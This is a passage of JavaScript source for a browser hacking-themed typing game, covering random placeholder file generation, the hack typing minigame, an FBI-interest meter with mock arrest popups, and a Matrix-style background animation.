          out += paragraph(randInt(6,12)) + '\n\n';
        });
        return out;
      }

      // long novel-like content
      function longStory() {
        let out = '';
        const chapters = randInt(6,18);
        for (let c=1;c<=chapters;c++) {
          out += `Chapter ${c}\n`;
          out += paragraph(randInt(6,12)) + '\n\n';
        }
        return out;
      }

      // generate content by category hints or filename hints
      if (name.toLowerCase().includes('invoice') || cat.includes('finance') || name.toLowerCase().includes('statement') || name.toLowerCase().includes('transactions')) {
        return bigCsv(['date','txn_id','type','amount','account'], randInt(40,200));
      }
      if (name.toLowerCase().includes('payroll') || name.toLowerCase().includes('payroll') || cat.includes('hr')) {
        return bigCsv(['id','name','position','salary','bank_account'], randInt(50,300));
      }
      if (name.toLowerCase().includes('patients') || cat.includes('health') || cat.includes('hospital') || cat.includes('clinic') ) {
        return bigCsv(['id','name','dob','diagnosis','notes'], randInt(30,200));
      }
      if (name.toLowerCase().includes('experiment') || cat.includes('research') || cat.includes('research lab') || name.toLowerCase().includes('dataset')) {
        // dataset: many numeric rows
        let o = '';
        const rows = randInt(200,1200);
        for (let i=0;i<rows;i++) o += `${i+1},${(Math.random()*1000).toFixed(6)},${(Math.random()*1).toFixed(8)},${randInt(0,1)}\n`;
        return `# ${name} - Generated dataset\n` + o;
      }
      if (name.toLowerCase().includes('manual') || name.toLowerCase().includes('instructions') || cat.includes('manual') || cat.includes('engineering')) {
        return longStory();
      }
      if (name.toLowerCase().includes('thesis') || name.toLowerCase().includes('paper') || cat.includes('university') || cat.includes('research')) {
        return researchPaper();
      }
      if (name.toLowerCase().includes('poem') || name.toLowerCase().includes('haiku') || cat.includes('poem') ) {
        let out=''; for (let i=0;i<randInt(6,20);i++) out += paragraph(1) + '\n\n'; return out;
      }
      if (name.toLowerCase().includes('letter') || name.toLowerCase().includes('love') || name.toLowerCase().includes('diary') || cat.includes('personal')) {
        return longStory();
      }
      if (name.toLowerCase().includes('credentials') || name.toLowerCase().includes('password') || name.toLowerCase().includes('secrets') || cat.includes('security')) {
        // include many fake credentials
        let o=''; for (let i=0;i<randInt(20,120);i++) o += `${randChoice(['admin','root','user','svc','backup'])}${randInt(1,9999)}:${Math.random().toString(36).slice(2,16)}\n`;
        return o;
      }
      if (name.toLowerCase().includes('wallet') || name.toLowerCase().includes('wallet') || cat.includes('crypto')) {
        let o=''; for (let i=0;i<randInt(30,200);i++) o += `0x${Math.random().toString(16).slice(2,40)} ${ (Math.random()*10).toFixed(6) }\n`; return o;
      }
      if (name.toLowerCase().includes('.bin') || name.toLowerCase().includes('.exe') || name.toLowerCase().includes('malware') || cat.includes('security')) {
        // hex dump like binary blob
        let o=''; for (let i=0;i<randInt(200,800);i++) o += Math.floor(Math.random()*256).toString(16).padStart(2,'0') + (i%32===31 ? '\n' : ' ');
        return o;
      }

      // fallback: long report-like content
      return researchPaper();
    }

    // Build the host file list by sampling the master pool and tailoring to category
    const pool = window._game._masterFilenamePool.slice();
    // prefer filenames that match category hint if possible
    const matches = pool.filter(p => p.toLowerCase().includes(cat.toLowerCase().split(/\s+/)[0]));
    const count = randInt(2,8);
    const chosen = new Set();
    if (matches.length > 0) {
      while (chosen.size < Math.min(matches.length, Math.max(1, Math.floor(count/2)))) chosen.add(randChoice(matches));
    }
    // fill remaining slots with random selections
    while (chosen.size < count) chosen.add(randChoice(pool));

    const out = [];
    const now = Date.now();
    Array.from(chosen).forEach(name => {
      const content = generateLargeContent(name, cat);
      // file size should be a random number between 1 and 1337 bytes
      const size = randInt(1, 1337);
      const past = now - randInt(0, 5 * 365) * 24 * 3600 * 1000;
      const mtime = new Date(past).toISOString();
      out.push({ name, content, size, mtime });
    });

    files[key] = out;
    return out;
  }

  // hack minigame state
  let hackState = null; // {target, command, pos, mistakes, combo, multiplier}

  // update the blinking cursor inside the minigame to show current typing position
  function updateMinigameCursor() {
    try {
      if (!minigameEl) return;
      // remove any existing 'next' marker classes
      try { Array.from(minigameEl.children).forEach(c => { c.classList.remove('next'); }); } catch(e){}
      // remove any temporary placeholder we previously inserted
      try { const tmp = minigameEl.querySelectorAll('.next-empty'); tmp.forEach(t => { if (t && t.parentNode) t.parentNode.removeChild(t); }); } catch(e){}

      // only show the underbar when a hack is active
      if (!hackState) return;
      const pos = Math.max(0, Math.min(hackState.pos || 0, minigameEl.children.length));
      if (pos < minigameEl.children.length) {
        const target = minigameEl.children[pos];
        try { target.classList.add('next'); } catch(e){}
      } else {
        // if cursor is at end, append a tiny placeholder span to host the underbar
        const span = document.createElement('span');
        span.className = 'char next next-empty';
        span.textContent = '';
        try { minigameEl.appendChild(span); } catch(e){}
      }
    } catch (e) {}
  }

  // helper to update combo UI inside minigame
  function updateComboUI() {
    // No inline combo UI in the minigame (per design); left-side UI updated via renderMeters()
    renderMeters();
  }

  // micro-toast helper for tiny +1/-1 indicators that shoot out of the multiplier
  function showMicroToast(text, opts = {}) {
    try {
      const el = document.createElement('div');
      el.className = 'micro-toast ' + (opts.type === 'danger' ? 'danger' : 'success');
      el.textContent = text;
      document.body.appendChild(el);
      // position near the multiplier element if present
      const sm = document.getElementById('score-mult');
      if (sm) {
        const r = sm.getBoundingClientRect();
        el.style.position = 'fixed';
        // randomize a little so multiple toasts don't overlap perfectly
        const jitterX = Math.round((Math.random()-0.5) * 18);
        el.style.left = (r.left + r.width/2 + jitterX) + 'px';
        el.style.top = (r.top + 6) + 'px';
        el.style.transform = 'translate(-50%, -50%)';
      }
      // prefer CSS-driven animation for smoother fade and no blinking
  const dur = opts.duration || 1400; // last slightly longer for visual effect
  // randomize direction and distance when not specified
  const randAngle = Math.random() * Math.PI * 2; // full circle
  const dist = opts.distance || (120 + Math.random() * 120); // 120..240px
  const dx = (opts.direction === 'left') ? -dist : (opts.direction === 'right') ? dist : Math.round(Math.cos(randAngle) * dist);
  const dy = (opts.direction === 'up') ? -dist : (opts.direction === 'down') ? dist : Math.round(Math.sin(randAngle) * dist * -1);
  el.style.setProperty('--micro-dx', dx + 'px');
  el.style.setProperty('--micro-dy', dy + 'px');
      el.style.setProperty('--micro-dur', dur + 'ms');
      // attach neon glow class
      el.classList.add('animate');

      // If this micro-toast is a multiplier indicator or explicitly requested, spawn small spark particles
      const wantsSparks = opts.spark || /x\d+/i.test(String(text));
      if (wantsSparks) {
        const sparks = Math.min(8, 3 + Math.floor(Math.random()*6));
        const container = document.createElement('div'); container.className = 'micro-sparks';
        el.appendChild(container);
        for (let i=0;i<sparks;i++) {
          const sp = document.createElement('div'); sp.className = 'micro-spark';
          // randomize color tint slightly
          const hue = 150 + Math.floor(Math.random()*60);
          sp.style.background = `radial-gradient(circle, hsl(${hue}deg 100% 70%) 0%, hsl(${hue}deg 80% 55%) 60%)`;
          container.appendChild(sp);
          // stagger animation start
          const st = Math.random() * 200;
          setTimeout(() => { sp.classList.add('animate'); }, st);
          // remove spark after animation
          setTimeout(() => { try { if (sp && sp.parentNode) sp.parentNode.removeChild(sp); } catch (e) {} }, dur + 600 + st);
        }
      }

      setTimeout(()=>{ try{ if(el && el.parentNode) el.parentNode.removeChild(el); }catch(e){} }, dur + 420);
    } catch (e) {}
  }

  function startHack(target) {
    window._game = window._game || {};
    const hist = window._game.scanHistory || [];
    // ensure persisted multiplier is sane
    window._game.lastMultiplier = Math.max(1, window._game.lastMultiplier || 1);
    // prevent re-hacking of machines already owned
    window._game.owned = window._game.owned || [];
    const already = window._game.owned.find(o => o.includes(target));
    if (already) {
      appendLine('That computer is already hacked: ' + already, 'muted');
      return;
    }
    // find match by ip or host substring
    const match = hist.find(line => line.includes(target));
    if (!match) {
      appendLine('Target not found in scan results.', 'muted');
      return;
    }

    const parts = match.split('  ');
    const ip = parts[0];
    const host = parts[1];

    // prepare random bash command
    let command;
    // if this is the FBI, create an intentionally long and hard l337 command
    if ((host || '').toLowerCase().includes('fbi.gov')) {
      // FBI targets remain intentionally long and hard
      command = makeFbiCommand();
      // indicate we're hacking the FBI for special arrest handling
      window._game = window._game || {};
      window._game._hackingFbi = true;
    } else {
      // build a larger pool of hack commands for this target and pick one randomly
      const pool = buildHackCommandPool(host, ip);
      command = pool[Math.floor(Math.random() * pool.length)];
      // non-FBI commands are already generated to be single-line and short
    }

  // init combo and multiplier
  window._game = window._game || {};
  const persistedMult = window._game.lastMultiplier || 1;
  hackState = { target: match, command, pos: 0, mistakes: 0, combo: 0, multiplier: persistedMult };
  // starting a hack is noisy: bump FBI interest
  state.fbiInterest = Math.min(100, (state.fbiInterest || 0) + 10);
  try { showFbiToast('+10', { duration: 1300 }); } catch(e){}
  renderMeters();

  // start a 1s FBI interest tick while hacking
  if (!window._game) window._game = {};
  if (window._game._hackFbiInterval) clearInterval(window._game._hackFbiInterval);
  window._game._hackFbiInterval = setInterval(() => {
    // if a modal is open, pause FBI interest while the player reads it
      if (!(window._game && window._game.modalOpen)) {
      state.fbiInterest = Math.min(100, (state.fbiInterest || 0) + 1);
  try { showFbiToast('+1', { duration: 900 }); } catch(e){}
    }
    renderMeters();
    if (state.fbiInterest >= 100) {
      // trigger capture and end hack
      handleFbiCapture('during hack minigame (auto)');
      endHack(false);
    }
  }, 1000);

    // show minigame
    minigameEl.innerHTML = '';
    for (let ch of command) {
      const span = document.createElement('span');
      span.className = 'char';
      // keep real character as textContent so comparisons still work
      span.textContent = ch;
      // mark spaces so they can be rendered visibly via CSS
      if (ch === ' ') span.classList.add('space');
      minigameEl.appendChild(span);
    }
    minigameEl.classList.add('visible');
    minigameEl.setAttribute('aria-hidden','false');
  }

  function endHack(success) {
    // stop the hack FBI interval if running
    try {
      if (window._game && window._game._hackFbiInterval) {
        clearInterval(window._game._hackFbiInterval);
        window._game._hackFbiInterval = null;
      }
    } catch (e) {}
    // clear any partially accrued points on abort
    if (hackState) hackState.currentPoints = 0;
    renderMeters();
    minigameEl.classList.remove('visible');
    minigameEl.setAttribute('aria-hidden','true');
    // if successful hack, transfer ownership and show brief success message
    if (success) {
      window._game = window._game || {};
      const hist = window._game.scanHistory || [];
      const ip = hackState.target.split('  ')[0];
      const host = hackState.target.split('  ')[1];
      // mark this as owned (persisted)
      window._game.owned = window._game.owned || [];
      window._game.owned.push(hackState.target);
      // remove from scan history
      window._game.scanHistory = hist.filter(e => e !== hackState.target);
  // show success lines as floating toasts instead of cluttering terminal
  appendLine('Hack successful! You now own this machine: ' + host, 'muted');
      // award points: successful hack gives a flat 1000 HACKER SCORE
      const bonus = 1000;
      state.hackerScore += bonus;
      lastHackerScore = Math.max(lastHackerScore, state.hackerScore);
  // persist multiplier achieved during this hack so it carries forward
  try { window._game = window._game || {}; window._game.lastMultiplier = Math.max(1, (hackState && hackState.multiplier) || (window._game.lastMultiplier || 1)); } catch(e){}
      renderMeters();
    } else {
      appendLine('Hack aborted.', 'muted');
    }
    // clear hack state
    hackState = null;
    // ensure no stray cursor remains
    try { updateMinigameCursor(); } catch(e){}
  }

  // final win sequence when FBI hacked
  function showUltimateWin() {
    // show a dramatic modal with an 'FBI system' image and a giant green skull message
    try {
      if (document.getElementById('game-modal')) return;
      const overlay = document.createElement('div');
      overlay.id = 'game-modal';
      overlay.style.position = 'fixed';
      overlay.style.left = '0'; overlay.style.top = '0'; overlay.style.width = '100%'; overlay.style.height = '100%';
      overlay.style.background = 'rgba(0,0,0,0.9)';
      overlay.style.display = 'flex'; overlay.style.alignItems = 'center'; overlay.style.justifyContent = 'center';
  overlay.style.zIndex = 1100000;

      const box = document.createElement('div');
      box.style.background = '#030303';
      box.style.color = '#dfffe0';
      box.style.border = '2px solid rgba(0,255,120,0.06)';
      box.style.padding = '26px';
      box.style.maxWidth = '920px';
      box.style.width = '90%';
      box.style.boxShadow = '0 16px 64px rgba(0,0,0,0.9)';
      box.style.fontFamily = 'monospace';
      box.style.textAlign = 'center';

      // fake FBI system image (styled div)
      const art = document.createElement('div');
      art.style.background = 'linear-gradient(180deg,#071018,#000)';
      art.style.border = '2px solid rgba(255,255,255,0.04)';
      art.style.padding = '18px';
      art.style.marginBottom = '18px';
      art.style.borderRadius = '8px';
      art.style.display = 'flex';
      art.style.flexDirection = 'column';
      art.style.alignItems = 'center';
      art.style.justifyContent = 'center';

      const seal = document.createElement('div');
      // Banner text indicating the mainframe has been compromised
      seal.textContent = 'FBI MAINFRAME HAS BEEN HACKED!!!!!';
      seal.style.fontSize = '28px';
      seal.style.letterSpacing = '2px';
      seal.style.color = '#fff';
      seal.style.marginBottom = '12px';
      art.appendChild(seal);

      const img = document.createElement('div');
      img.style.width = '680px';
      img.style.height = '260px';
      img.style.background = 'linear-gradient(90deg,#0b2940,#031a29)';
      img.style.border = '1px solid rgba(255,255,255,0.04)';
      img.style.borderRadius = '6px';
      img.style.display = 'flex';
      img.style.alignItems = 'center';
      img.style.justifyContent = 'center';
      img.style.color = '#9fffbf';
      img.style.fontSize = '18px';
      // Place the skull and the green success text inside the main art pane
      img.innerHTML = `
        <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;">
          <div style=\"font-size:72px;color:#5fff5f;font-weight:900;filter:drop-shadow(0 18px 36px rgba(0,255,60,0.18))\">☠</div>
          <div style=\"font-size:22px;color:#7fff7f;font-weight:900;margin-top:12px;text-align:center;letter-spacing:1px\">YOU HAVE PWNED THE FBI!!!!! YOU WIN!!!!</div>
        </div>
      `;
      art.appendChild(img);

      box.appendChild(art);

      // Play Again button with l337 styling
      const btn = document.createElement('button');
      btn.textContent = 'PLAY AGAIN — 1337 REBOOT';
      btn.style.padding = '12px 20px';
      btn.style.fontFamily = 'monospace';
      btn.style.fontSize = '16px';
      btn.style.cursor = 'pointer';
      btn.style.background = 'linear-gradient(90deg,#06b36b,#00ff90)';
      btn.style.color = '#041018';
      btn.style.fontWeight = '900';
      btn.style.border = '0';
      btn.style.borderRadius = '8px';
      btn.style.boxShadow = '0 10px 30px rgba(0,255,120,0.12), inset 0 -6px 18px rgba(255,255,255,0.04)';
      btn.addEventListener('click', () => {
        try { location.reload(); } catch (e) { try { document.body.removeChild(overlay); } catch(e){} }
      });
      box.appendChild(btn);

      overlay.appendChild(box);
      document.body.appendChild(overlay);
      // append terminal final lines
      appendLine('*** FINAL: FBI COMPROMISED ***', 'muted');
      appendLine('You are the most l337 hacker. Game complete.', 'muted');
    } catch (e) {
      try { alert('YOU WIN - FBI PWNED'); } catch (e) {}
    }
  }

  // list-downloads command (local)
  // placed after endHack so helper functions are available
  // handler in main router should recognize 'list-downloads' which was added to COMMANDS

  // FBI interest decay: reduce faster now. Decay pauses while the hacking minigame is active (hackState)
  // New behavior: decay 1 point every 800ms when not hacking (faster decrease), pause while hacking.
  // FBI interest decay: only decrease when player is in the main terminal (not connected)
  setInterval(() => {
    try {
      if (typeof state.fbiInterest === 'number' && state.fbiInterest > 0) {
        // only decay when NOT connected to a remote machine and not mid-hack
        if (connection || hackState) return;
        const decayMult = (window._game && window._game.fbiDecayMultiplier) ? window._game.fbiDecayMultiplier : 1;
        // decay more per tick when upgrades increase decay rate
        const decayAmount = Math.max(1, Math.floor(1 * decayMult));
        state.fbiInterest = Math.max(0, state.fbiInterest - decayAmount);
        renderMeters();
      }
    } catch (e) {}
  }, 800);

  // Ghost passive drain: for each Ghost level, reduce FBI interest by that many points per second
  // This only applies while the player is in the main terminal (not connected) and not mid-hack
  setInterval(() => {
    try {
      if (window._game && window._game._gameOver) return;
      const ghostLevel = (window._game && window._game.ghostLevel) ? window._game.ghostLevel : 0;
      if (!ghostLevel) return;
      if (connection || hackState) return; // only while in main terminal and not hacking
      if (typeof state.fbiInterest === 'number' && state.fbiInterest > 0) {
        state.fbiInterest = Math.max(0, state.fbiInterest - ghostLevel);
        try { renderMeters(); } catch(e){}
      }
    } catch (e) {}
  }, 1000);

  // While connected to a remote machine, FBI interest slowly increases by 1 per second.
  setInterval(() => {
    try {
      if (window._game && window._game._gameOver) return;
      if (connection) {
        if (typeof state.fbiInterest === 'number' && state.fbiInterest < 100) {
          state.fbiInterest = Math.min(100, state.fbiInterest + 1);
          try { showFbiToast('+1', { duration: 900 }); } catch(e){}
          try { renderMeters(); } catch(e){}
        }
      }
    } catch (e) {}
  }, 1000);

  // Safety watcher: if any code path sets the FBI interest to >=100 but forgot to call capture,
  // ensure capture is triggered. handleFbiCapture will noop if a recent capture is already active.
  setInterval(() => {
    try {
      if (window._game && window._game._gameOver) return;
      if (typeof state.fbiInterest === 'number' && state.fbiInterest >= 100) {
        // provide context so the handler can log where it came from when appropriate
        handleFbiCapture('auto-watch');
      }
    } catch (e) {}
  }, 500);

  // helper: show a dismissible modal popup (non-blocking)
  function showModal(title, message) {
    try {
      // don't create multiple at once
      if (document.getElementById('game-modal')) return;
      const overlay = document.createElement('div');
      overlay.id = 'game-modal';
      overlay.style.position = 'fixed';
      overlay.style.left = '0'; overlay.style.top = '0'; overlay.style.width = '100%'; overlay.style.height = '100%';
      overlay.style.background = 'rgba(0,0,0,0.6)';
      overlay.style.display = 'flex'; overlay.style.alignItems = 'center'; overlay.style.justifyContent = 'center';
  overlay.style.zIndex = 1100000;

     
      const box = document.createElement('div');
      box.style.background = '#0b0b0b';
      box.style.color = '#cfcfcf';
      box.style.border = '1px solid #303030';
      box.style.padding = '20px';
      box.style.maxWidth = '600px';
      box.style.boxShadow = '0 8px 24px rgba(0,0,0,0.8)';
      box.style.fontFamily = 'monospace';
      box.style.fontSize = '14px';

      const h = document.createElement('div');
      h.style.fontWeight = '700';
      h.style.marginBottom = '8px';
      h.textContent = title || 'Notice';
      box.appendChild(h);

      const p = document.createElement('div');
      p.style.whiteSpace = 'pre-wrap';
      p.textContent = message || '';
      box.appendChild(p);

  const btn = document.createElement('button');
  btn.textContent = 'Close';
      btn.style.marginTop = '12px';
      btn.style.padding = '6px 10px';
      btn.style.background = '#111';
      btn.style.color = '#eee';
      btn.style.border = '1px solid #444';
      btn.style.cursor = 'pointer';
      btn.addEventListener('click', () => { 
        try { document.body.removeChild(overlay); } catch(e){}
        // clear modalOpen flag when closed
        try { window._game = window._game || {}; window._game.modalOpen = false; } catch(e){}
        // refocus input so player can keep typing without clicking
        try { inputEl.focus(); } catch(e){}
      });
      // mark modal open so other systems can pause
      try { window._game = window._game || {}; window._game.modalOpen = true; } catch(e){}
      box.appendChild(btn);

      overlay.appendChild(box);
      document.body.appendChild(overlay);
    } catch (e) {
      // fallback to alert if DOM operations fail
      try { alert((title ? title + '\n\n' : '') + (message || '')); } catch (e) {}
    }
  }

  // handle FBI capture: non-blocking popup, halve hacker score, apply cooldown so it doesn't repeatedly trigger
  function handleFbiCapture(contextNote) {
    window._game = window._game || {};
    if (window._game._fbiCaught) return; // already handled recently
    window._game._fbiCaught = true;
    // If player is currently connected to a remote host, force-disconnect them
    try {
      if (connection) {
        appendLine('Connection severed: remote host disconnected due to FBI trace. Returning to main terminal...', 'muted');
        connection = null;
        try { const ps = document.querySelector('.prompt'); if (ps) ps.textContent = 'guest@l33t:~$'; } catch(e){}
      }
    } catch(e) {}
    // If a hacking minigame is active, abort it and return the player to the main terminal
    try {
      if (typeof hackState !== 'undefined' && hackState) {
        try { endHack(false); } catch(e){}
        // ensure UI shows the main prompt and input is enabled
        try { const ps = document.querySelector('.prompt'); if (ps) ps.textContent = 'guest@l33t:~$'; } catch(e){}
        try { if (inputEl) { inputEl.disabled = false; inputEl.focus(); } } catch(e){}
      }
    } catch(e) {}
    // notify in terminal
    appendLine('*** ALERT: FEDERAL INVESTIGATIONS BUREAU HAS IDENTIFIED YOU ***', 'muted');
  if (contextNote) appendLine(`${contextNote}`, 'muted');
    appendLine('FBI tracing complete. Field agents are en route and your systems have been linked to your identity.', 'muted');
  // penalty: cut hacker score in half (round down)
  const before = Math.max(0, Math.floor(state.hackerScore));
  const newScore = Math.floor(before / 2);
  const lost = before - newScore;
  state.hackerScore = newScore;
    lastHackerScore = Math.max(lastHackerScore, state.hackerScore);
    try { showToast(`-${lost} HACKER SCORE — FBI capture`, { type: 'danger', duration: 6000 }); } catch(e){}
    renderMeters();
  // show modal popup with official-sounding FBI notice and penalties
  showModal('FBI NOTICE: YOU ARE UNDER ARREST', `This is an official notification from the Federal Bureau of Investigation.\n\nThe FBI has been monitoring your online activities and has identified your involvement in unauthorized access, exfiltration of protected systems, and other federal cyber offenses. You are now the subject of a federal criminal investigation and may be prosecuted under United States law.\n\nPotential consequences include arrest, seizure of electronic devices and data, substantial fines, and imprisonment. This notice documents the initiation of enforcement actions against accounts and systems associated with your activity.\n\nAs an immediate administrative penalty in this simulation, your Download Multiplier will be reduced to zero and your Hacker Score will be reduced by 50%.\n\nThis is an official law enforcement notice. Continued unauthorized activity may result in additional charges and more severe penalties.\n\nSincerely,\nFederal Bureau of Investigation\n\nP.S. LOL — that was pathetic. Your "hack" looked like somebody smashing their forehead on a keyboard. Dont think of doing this again. We WILL catch you.`);
  // reduce immediate interest so the game doesn't re-trigger continuously: cut current FBI interest in half
  state.fbiInterest = Math.floor((state.fbiInterest || 100) / 2);
    renderMeters();
  // cheeky, humiliating follow-up from the FBI
  try { appendLine('OFFICIAL ADDENDUM: You were laughably easy to trace. Farewell, amateur — the net was not impressed.', 'muted'); } catch(e){}
  // reset persisted multiplier on capture: immediate subtraction by current multiplier
  try {
    if (window._game._deflateInterval) { clearInterval(window._game._deflateInterval); window._game._deflateInterval = null; }
    if (hackState && hackState.multiplier && hackState.multiplier > 1) {
      const cur = Math.max(1, hackState.multiplier || (window._game && window._game.lastMultiplier) || 1);
      const decreaseAmount = cur;
      hackState.multiplier = Math.max(1, cur - decreaseAmount);
      try { window._game.lastMultiplier = Math.max(1, hackState.multiplier); } catch(e){}
      try { showMicroToast(`-${decreaseAmount}`, { type: 'danger', duration: 1600, direction: 'left' }); } catch(e){}
      renderMeters();
    } else {
      window._game.lastMultiplier = 1;
    }
  } catch(e){}
    // cooldown: allow next capture after 8 seconds
    // if we were hacking the FBI, end the game completely with life imprisonment modal
    if (window._game && window._game._hackingFbi) {
      try {
        // disable input
        try { inputEl.disabled = true; } catch (e) {}
        // show final arrest modal
        const overlay = document.createElement('div');
        overlay.id = 'game-modal';
        overlay.style.position = 'fixed';
        overlay.style.left = '0'; overlay.style.top = '0'; overlay.style.width = '100%'; overlay.style.height = '100%';
        overlay.style.background = 'rgba(0,0,0,0.95)';
        overlay.style.display = 'flex'; overlay.style.alignItems = 'center'; overlay.style.justifyContent = 'center';
  overlay.style.zIndex = 1100000;
        const box = document.createElement('div');
        box.style.background = '#050505';
        box.style.color = '#ffdddd';
        box.style.border = '2px solid rgba(255,0,0,0.12)';
        box.style.padding = '26px';
        box.style.maxWidth = '820px';
        box.style.boxShadow = '0 20px 80px rgba(0,0,0,0.9)';
        box.style.fontFamily = 'monospace';
        box.style.textAlign = 'center';
        const h = document.createElement('div'); h.style.fontSize='22px'; h.style.fontWeight='900'; h.style.color='#ff8080'; h.textContent = 'OFFICIAL NOTICE: ARRESTED FOR FEDERAL TRESPASS'; box.appendChild(h);
        const p = document.createElement('div'); p.style.marginTop='12px'; p.style.whiteSpace='pre-wrap'; p.textContent = `You were caught attempting to hack the Federal Bureau of Investigation.\n\nThis attempt constitutes a federal crime. You will be prosecuted to the fullest extent of the law, and are hereby sentenced to life imprisonment in this simulation. Your game has ended.`; box.appendChild(p);
        const btn = document.createElement('button'); btn.textContent='Exit to Desktop'; btn.style.marginTop='18px'; btn.style.padding='8px 12px'; btn.style.cursor='pointer'; btn.addEventListener('click', ()=>{ try { location.reload(); } catch(e){} }); box.appendChild(btn);
        overlay.appendChild(box); document.body.appendChild(overlay);
      } catch (e) {}
      // permanently mark game-over so safety watcher won't re-trigger
      window._game._gameOver = true;
      return; // do not schedule a cooldown
    }
    setTimeout(() => { window._game._fbiCaught = false; }, 8000);
  }


  // initial welcome
  appendLine('Super l337 Hacker - Retro Simulator', 'muted');
  appendLine('Type \"help\" to see available commands.', 'muted');
  renderMeters();
  try { showUnlockBanner('Try scanning!'); } catch(e) {}
  try { renderUpgradeBadges(); } catch(e){}

  // ensure the input is focused on initial load so player can start typing immediately
  try { inputEl.focus(); } catch(e){}

  // global click handler: if user clicks anywhere (not on inputs/buttons), refocus the command input
  try {
    document.addEventListener('click', (ev) => {
      try {
        const t = ev.target;
        if (!t) return;
        const tag = (t.tagName || '').toLowerCase();
        if (tag === 'input' || tag === 'textarea' || t.isContentEditable || tag === 'button') return;
        // do not steal focus when clicking inside a modal or shop
        if (t.closest && (t.closest('#game-modal') || t.closest('.shop-modal') || t.closest('.shop-item'))) return;
        try { inputEl.focus(); } catch(e){}
      } catch(e){}
    }, { capture: true });
  } catch(e){}

  // global key handler: if the shop modal is open, pressing any key closes it (unless focus is in an input)
  try {
    document.addEventListener('keydown', (ev) => {
      try {
        const active = document.activeElement;
        const tag = (active && active.tagName) ? active.tagName.toLowerCase() : null;
        if (tag === 'input' || tag === 'textarea' || (active && active.isContentEditable)) return;
        const shop = document.getElementById('shop-modal');
        if (shop) {
          try { shop.parentNode.removeChild(shop); } catch(e){}
          try { inputEl.focus(); } catch(e){}
        }
      } catch(e){}
    }, { capture: true });
  } catch(e){}

  // expose some test helpers to console for manual testing without overwriting game state
  window._game = window._game || {};
  window._game.state = state;
  window._game.addHackerPoints = function(n = 10) { state.hackerScore += n; lastHackerScore = Math.max(lastHackerScore, state.hackerScore); renderMeters(); };
  window._game.addFbiPoints = function(n = 10) { state.fbiInterest = Math.min(100, state.fbiInterest + n); try { showFbiToast('+'+n, { duration: 1100 }); } catch(e){} renderMeters(); if (state.fbiInterest >= 100) handleFbiCapture('manual increase'); };
  
  // --- Matrix background animation (subtle, bright green) ---
  try {
    const canvas = document.getElementById('matrix-canvas');
    if (canvas && canvas.getContext) {
      const ctx = canvas.getContext('2d');
      let width = canvas.width = window.innerWidth;
      let height = canvas.height = window.innerHeight;
      const cols = Math.floor(width / 14);
      const drops = new Array(cols).fill(1);
      const letters = 'abcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()[]{}<>?/\\|'.split('');
      function resize() {
        width = canvas.width = window.innerWidth;
        height = canvas.height = window.innerHeight;
        const newCols = Math.max(20, Math.floor(width / 14));
        drops.length = newCols;
        for (let i = 0; i < drops.length; i++) if (!drops[i]) drops[i] = Math.floor(Math.random()*height/14);
      }
      window.addEventListener('resize', resize);
      function frame() {
        // darken the canvas slightly for trailing effect
        ctx.fillStyle = 'rgba(0,16,0,0.1)';
        ctx.fillRect(0,0,width,height);
        ctx.font = '14px monospace';
        for (let i = 0; i < drops.length; i++) {
          const x = i * 14;
          const y = drops[i] * 14;
          const text = letters[Math.floor(Math.random()*letters.length)];
          // bright head
          ctx.fillStyle = 'rgba(140,255,120,0.95)';
          ctx.fillText(text, x, y);
          // dim trail
          ctx.fillStyle = 'rgba(30,120,40,0.35)';
          ctx.fillText(text, x, y - 14);
          drops[i] = (drops[i] > height / 14 || Math.random() > 0.995) ? 0 : drops[i] + 1;
        }
        requestAnimationFrame(frame);
      }
      // initial clear
      ctx.fillStyle = '#001005'; ctx.fillRect(0,0,width,height);
      requestAnimationFrame(frame);
    }
  } catch (e) {}
  // Debug beat button removed: keep console helpers only

})();
